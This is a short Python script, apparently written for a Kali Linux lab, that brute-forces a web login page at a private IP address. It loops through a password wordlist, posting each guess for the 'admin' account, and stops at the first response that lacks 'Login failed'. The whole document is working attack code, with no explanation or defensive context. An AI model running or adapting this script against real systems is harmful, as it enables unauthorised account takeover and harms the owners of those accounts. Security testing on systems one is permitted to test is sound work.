import requests

target_url = "http://192.168.1.16:80/login.php"  # Replace with the actual target URL

data_dict = {
    "username": "admin",
    "password": "password",
    "Login": "submit"
}

try:
    response = requests.post(target_url, data=data_dict)
    print(response.content)

    with open("/home/kali/Downloads/passwords.txt", "r") as word_list_file:
        for wl in word_list_file:
            word = wl.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            if "Login failed" not in response.content.decode():
                print(f"Password found: {word}")
                break
        
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
except Exception as e:
    print(f"An unexpected error occurred: {e}")

